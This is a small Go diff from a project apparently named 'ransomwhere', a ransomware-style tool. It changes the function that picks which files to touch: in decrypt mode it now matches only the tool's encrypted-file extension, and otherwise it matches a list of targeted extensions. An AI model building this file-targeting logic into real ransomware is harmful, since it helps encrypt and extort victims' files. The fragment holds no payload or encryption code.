@@ -2,6 +2,7 @@ package file
 
 import (
 	"path/filepath"
+	"ransomwhere/pkg/crypto"
 	"strings"
 )
 
@@ -24,13 +25,17 @@ var (
 	}
 )
 
-func MatchFile(name string) bool {
+func MatchFile(opMode, name string) bool {
 	extension := filepath.Ext(name)
 	if extension == "" {
 		return false
 	}
 
 	extension = strings.TrimSpace(strings.ToLower(extension))
+
+	if opMode == OpModeDecrypt {
+		return extension == crypto.CryptedExtension
+	}
 
 	for _, ext := range extensions {
 		if strings.EqualFold(extension, ext) {
